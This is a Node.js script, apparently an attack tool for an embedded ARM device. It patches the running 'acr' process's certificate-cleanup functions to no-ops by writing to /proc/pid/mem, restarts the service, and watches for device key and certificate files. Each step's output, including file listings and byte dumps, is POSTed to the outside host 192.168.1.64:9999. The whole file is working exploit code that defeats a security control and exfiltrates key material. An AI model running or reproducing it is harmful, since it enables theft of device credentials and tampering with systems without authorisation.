"use strict";
// audit98.js - (1) list /tmp/acr/cert contents, (2) patch acr's cert-cleanup
// functions to no-ops so m_WriteCertificationKeyFile's output persists,
// (3) restart acr to trigger key materialization.
// Cleanup fns (from dynsym):
//   m_RemoveCertificationFiles  VA 0x96f09 (sz 14)
//   ClearCertificationFiles     VA 0x96d39 (sz 250)
// Patch both to: movs r0,#0 ; bx lr  (00 20 70 47) = return 0, do nothing.
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var out = {};
out.started = new Date().toISOString();

// 1. inspect temp cert dir NOW
out.tmpacr = sh("find /tmp/acr -type f -exec ls -la {} \\; 2>&1; echo '---'; for f in /tmp/acr/cert/* /tmp/acr/path_exists/*; do if [ -f \"$f\" ]; then echo \"FILE $f ($(wc -c < $f) bytes)\"; head -c 80 \"$f\" | od -c | head -3; fi; done 2>&1", 3500);

// 2. get acr pid
out.pidof = sh("pidof acr", 200);
var pid = trim(out.pidof).match(/^(\d+)/);
pid = pid ? pid[1] : null;
out.pid = pid;

if (pid) {
    // patch cleanup fns to return 0 (movs r0,#0 ; bx lr = 00 20 70 47)
    sh("printf '\\x00\\x20\\x70\\x47' > /tmp/.nopstub", 100);
    var T = [
        { name: "m_RemoveCertificationFiles", addr: 0x96f08 },  // VA 0x96f09 thumb -> 0x96f08
        { name: "ClearCertificationFiles", addr: 0x96d38 }      // VA 0x96d39 thumb -> 0x96d38
    ];
    var res = [];
    T.forEach(function (t) {
        var dec = t.addr;
        var before = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 120));
        var wr = trim(sh("dd if=/tmp/.nopstub of=/proc/" + pid + "/mem bs=1 seek=" + dec + " count=4 conv=notrunc 2>&1 | tail -1", 120));
        var after = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 120));
        res.push({ name: t.name, addr: "0x" + t.addr.toString(16), before: before, write: wr, after: after,
                   ok: after.indexOf("00 20 70 47") >= 0 });
    });
    out.cleanup_patch = res;
}

post("/p98_pre", out);

// 3. restart acr to trigger key materialization with cleanup disabled
setTimeout(function () {
    var o2 = {};
    o2.stop = sh("systemctl stop acr.service 2>&1; echo RC=$?", 200);
    o2.start = sh("systemctl start acr.service 2>&1; echo RC=$?", 200);
    sh("sleep 5", 100);

    // re-patch cleanup fns on the NEW acr process
    var pid2 = trim(sh("pidof acr", 200)).match(/^(\d+)/);
    pid2 = pid2 ? pid2[1] : null;
    o2.pid2 = pid2;
    if (pid2) {
        sh("printf '\\x00\\x20\\x70\\x47' > /tmp/.nopstub", 100);
        var T2 = [
            { name: "m_RemoveCertificationFiles", addr: 0x96f08 },
            { name: "ClearCertificationFiles", addr: 0x96d38 }
        ];
        var res2 = [];
        T2.forEach(function (t) {
            var dec = t.addr;
            var before = trim(sh("dd if=/proc/" + pid2 + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 120));
            var wr = trim(sh("dd if=/tmp/.nopstub of=/proc/" + pid2 + "/mem bs=1 seek=" + dec + " count=4 conv=notrunc 2>&1 | tail -1", 120));
            var after = trim(sh("dd if=/proc/" + pid2 + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 120));
            res2.push({ name: t.name, before: before, after: after, ok: after.indexOf("00 20 70 47") >= 0 });
        });
        o2.cleanup_patch2 = res2;
    }
    post("/p98_restart", o2);

    // 4. watch for key file for 90s
    var t0 = Date.now();
    var iv = setInterval(function () {
        var f = sh("find /tmp/acr /usr/lib/acr/cert /tmp -maxdepth 3 -iname '*Key*' -o -iname '*DeviceCert*' 2>/dev/null | while read x; do if [ -f \"$x\" ]; then echo \"FOUND $x ($(wc -c < $x)b)\"; fi; done", 2500);
        if (f.indexOf("FOUND") >= 0) {
            post("/p98_keyfound", { at: new Date().toISOString(), detail: f });
        }
        if (Date.now() - t0 > 90000) {
            clearInterval(iv);
            post("/p98_watchdone", { at: new Date().toISOString(),
                final: sh("find /tmp/acr /usr/lib/acr/cert -type f 2>&1 | head -20", 2000) });
        }
    }, 3000);
}, 1500);
